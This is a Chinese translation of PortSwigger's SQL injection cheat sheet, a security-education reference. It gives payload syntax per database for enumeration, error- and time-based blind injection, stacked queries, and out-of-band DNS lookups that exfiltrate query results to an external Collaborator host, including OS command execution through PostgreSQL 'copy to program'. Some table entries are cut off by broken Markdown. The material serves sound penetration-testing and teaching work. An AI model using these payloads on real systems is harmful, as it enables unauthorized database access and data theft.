---
description: 原文链接：https://portswigger.net/web-security/sql-injection/cheat-sheet
---

# SQL注入备忘单

这个 SQL 注入备忘单包含了一些有用的语法例子，你可以用来执行 SQL 注入攻击时经常出现的各种任务。

## 字符串连接

你可以将多个字符串连接在一起以组成一个字符串。

| 数据库            | 语句                                                  |
| -------------- | --------------------------------------------------- |
| **Oracle**     | \`'foo'                                             |
| **Microsoft**  | `'foo'+'bar'`                                       |
| **PostgreSQL** | \`'foo'                                             |
| **MySQL**      | `'foo' 'bar'` \[注意两个字符串之间的空格] `CONCAT('foo','bar')` |

## 子字符串

你可以从指定的偏移量中提取字符串的部分长度。请注意偏移量的索引是基于1的。以下每个表达式都会返回字符串 `ba`。

| 数据库        | 语句                          |
| ---------- | --------------------------- |
| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

## 注释

你可以使用注释来截断一个查询，并删除输入之后的原始查询部分。

| 数据库        | 语句                                                                                                      |
| ---------- | ------------------------------------------------------------------------------------------------------- |
| Oracle     | `--comment`                                                                                             |
| Microsoft  | <p><code>--comment</code></p><p><code>/*comment*/</code></p>                                            |
| PostgreSQL | <p><code>--comment</code></p><p><code>/*comment*/</code></p>                                            |
| MySQL      | <p><code>#comment</code></p><p><code>-- comment</code> [注意双破折号后面的空格]</p><p><code>/*comment*/</code></p> |

## 数据库版本

你可以查询数据库以确定其类型和版本。这些信息在制定更复杂的攻击时很有用。

| 数据库        | 语句                                                              |
| ---------- | --------------------------------------------------------------- |
| Oracle     | `SELECT banner FROM v$version` `SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                              |
| PostgreSQL | `SELECT version()`                                              |
| MySQL      | `SELECT @@version`                                              |

## 数据库内容

你可以列出数据库中存在的表，以及这些表包含的列。

| 数据库        | 语句                                                                                                                        |
| ---------- | ------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT * FROM all_tables` `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                           |
| Microsoft  | `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## 条件错误

你可以测试单个布尔条件，如果条件为真则触发数据库错误。

| 数据库        | 语句                                                                                      |
| ---------- | --------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`      |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`           |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## 批处理（或堆叠）查询

你可以使用批处理查询来连续执行多个查询。请注意，虽然后续查询被执行，但结果不会返回给应用程序。因此，这种技术主要用于与盲目漏洞有关的情况，在这种情况下，你可以使用第二个查询来触发一个 DNS 查询、条件错误或时间延迟。

| 数据库        | 语句                           |
| ---------- | ---------------------------- |
| Oracle     | 不支持批处理查询                     |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE` |

> **注意**
>
> 对于 MySQL，批量查询通常不能用于 SQL 注入。然而，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库通信，这有时是可能的。

## 时间延迟

你可以在数据库处理查询时造成时间延迟。以下将造成10秒的无条件时间延迟。

| 数据库        | 语句                                    |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT sleep(10)`                    |

## 有条件的时间延迟

你可以测试一个布尔条件，如果条件为真就会触发一个时间延迟。

| 数据库        | 语句                                                                              |
| ---------- | ------------------------------------------------------------------------------- |
| Oracle     | \`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'                               |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                               |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`                                  |

## DNS查询

你可以使数据库执行对外部域执行 DNS 查询。要做到这一点，你需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个你将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以确认是否发生了 DNS 查询。

| 数据库        | 语句                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | 以下技术利用 XML 外部实体（[XXE](https://portswigger.net/web-security/xxe)）漏洞来触发 DNS 查询。该漏洞已经打了补丁，但仍有许多未打补丁的 Oracle 存在： `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual` 以下技术在打过补丁的 Oracle 中有效，但需要提升权限： `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
| Microsoft  | `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`                                                                                                                                                                                                                                                                                                                                                     |
| PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'`                                                                                                                                                                                                                                                                                                                                            |
| MySQL      | 以下技术仅在Windows系统中有效： `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`                                                                                                                                                                                                                                                                |

## 带数据渗出的DNS查询

你可以使数据库对包含注入查询结果的外部域进行 DNS 查询。要做到这一点，你需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个你将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的细节，包括被渗出的数据。

| 数据库        | 语句                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`                                                                                                                                                                                                                                                                   |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')`                                                                                                                                                                                                                                                                                                                                                          |
| PostgreSQL | <p><code>create OR replace function f() returns void as $$</code></p><p><code>declare c text;</code></p><p><code>declare p text;</code></p><p><code>begin</code></p><p><code>SELECT into p (SELECT YOUR-QUERY-HERE);</code></p><p><code>c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';</code></p><p><code>execute c;</code></p><p><code>END;</code></p><p><code>$$ language plpgsql security definer;</code></p><p><code>SELECT f();</code></p> |
| MySQL      | <p>以下技术仅在Windows系统中有效：</p><p><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</code></p>                                                                                                                                                                                                                                                                                                                                                                   |
